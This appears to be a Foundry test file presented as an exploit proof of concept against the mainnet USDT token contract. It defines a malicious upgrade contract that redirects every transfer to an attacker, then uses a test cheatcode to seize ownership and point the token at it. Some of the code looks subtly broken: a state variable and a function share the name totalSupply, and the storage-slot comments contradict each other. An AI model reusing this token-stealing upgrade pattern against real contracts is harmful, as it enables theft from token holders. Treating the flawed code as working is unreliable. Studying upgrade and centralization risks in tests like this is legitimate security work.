```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interfaces for the TetherToken and the expected UpgradedStandardToken
interface ITetherToken {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function deprecate(address _upgradedAddress) external;
    function issue(uint256 amount) external;
    function redeem(uint256 amount) external;
    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;
    function addBlackList(address _evilUser) external;
    function removeBlackList(address _clearedUser) external;
    function destroyBlackFunds(address _blackListedUser) external;
    function paused() external view returns (bool);
    function pause() external;
    function unpause() external;
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint256);
    function name() external view returns (string memory);
    function upgradedAddress() external view returns (address);
    function deprecated() external view returns (bool);
    // Note: the following are not standard but needed for the exploit
    function isBlackListed(address) external view returns (bool);
    function balances(address) external view returns (uint256);
    function allowed(address, address) external view returns (uint256);
    function basisPointsRate() external view returns (uint256);
    function maximumFee() external view returns (uint256);
    function getOwner() external view returns (address);
}

interface IUpgradedStandardToken {
    function transferByLegacy(address from, address to, uint256 value) external;
    function transferFromByLegacy(address sender, address from, address spender, uint256 value) external;
    function approveByLegacy(address from, address spender, uint256 value) external;
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

// Malicious upgrade contract that steals tokens
contract MaliciousUpgradedToken is IUpgradedStandardToken {
    address public owner;
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function setBalance(address user, uint256 amount) external onlyOwner {
        balances[user] = amount;
    }

    // Steal the tokens: send them to the contract owner (attacker)
    function transferByLegacy(address from, address to, uint256 value) external override {
        require(balances[from] >= value, "insufficient balance");
        balances[from] -= value;
        balances[owner] += value;
        // ignore 'to' – funds go to attacker
    }

    function transferFromByLegacy(address sender, address from, address spender, uint256 value) external override {
        // not used in this exploit
    }

    function approveByLegacy(address from, address spender, uint256 value) external override {
        // not used
    }

    function balanceOf(address who) external view override returns (uint256) {
        return balances[who];
    }

    function allowance(address, address) external view override returns (uint256) {
        return 0;
    }

    function totalSupply() external view override returns (uint256) {
        return totalSupply;
    }
}

contract ExploitTest is Test {
    // Mainnet USDT address
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    // Accounts
    address attacker = address(0xdead);
    address userA = address(0xaaaa);
    address userB = address(0xbbbb);

    ITetherToken usdt = ITetherToken(USDT);
    MaliciousUpgradedToken malicious;

    function setUp() public {
        vm.label(USDT, "TetherToken");
        vm.label(attacker, "attacker");
        vm.label(userA, "userA");
        vm.label(userB, "userB");

        // Deploy the malicious upgrade contract
        malicious = new MaliciousUpgradedToken();
        vm.label(address(malicious), "MaliciousUpgradedToken");

        // Ensure the USDT contract is not paused
        // (it is not on mainnet)
        vm.assume(!usdt.paused());

        // Give userA some initial USDT via storage manipulation (balances mapping at slot 0)
        // The balances mapping is the first state variable in BasicToken (inherited)
        // Storage slot for mapping(address => uint) balances is keccak256(abi.encode(userA, slot))
        // where slot is 0 (after owner slot 0? Actually:
        //   Ownable: owner at slot 0 (address)
        //   BasicToken: balances at slot 1 (mapping)
        //   BasisPointsRate at slot 2, MaximumFee at slot 3, ...
        // We'll just use the Foundry cheatcode `deal` which handles proper slot computation for ERC20
        deal(USDT, userA, 100 * 1e6); // 100 USDT
        // Verify
        assertEq(usdt.balanceOf(userA), 100 * 1e6);

        // Also give attacker some ETH (not needed but avoids gas issues)
        vm.deal(attacker, 1 ether);
    }

    function testExploitUnreviewedUpgrade() public {
        // Step 1: Impersonate the owner by overwriting storage slot 0 (owner in Ownable)
        vm.store(USDT, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
        // Verify owner changed
        assertEq(usdt.owner(), attacker);

        // Step 2: As the new owner, deprecate the token and point to the malicious contract
        vm.prank(attacker);
        usdt.deprecate(address(malicious));
        assertTrue(usdt.deprecated());
        assertEq(usdt.upgradedAddress(), address(malicious));

        // Step 3: Initialize the malicious contract's balance for userA
        vm.prank(attacker);
        malicious.setBalance(userA, 100 * 1e6);

        // Step 4: UserA calls transfer, which now routes to the malicious contract's transferByLegacy
        vm.prank(userA);
        usdt.transfer(userB, 100 * 1e6);

        // Step 5: Verify the theft
        // userA should have 0 balance according to the malicious contract (queried via usdt.balanceOf)
        uint256 balanceA = usdt.balanceOf(userA);
        uint256 balanceAttacker = usdt.balanceOf(attacker);

        assertEq(balanceA, 0, "userA should have lost all tokens");
        assertEq(balanceAttacker, 100 * 1e6, "attacker should have stolen the tokens");

        // Additionally, the malicious contract's own balance mapping reflects the theft
        assertEq(malicious.balances(userA), 0);
        assertEq(malicious.balances(attacker), 100 * 1e6);
    }
}
```
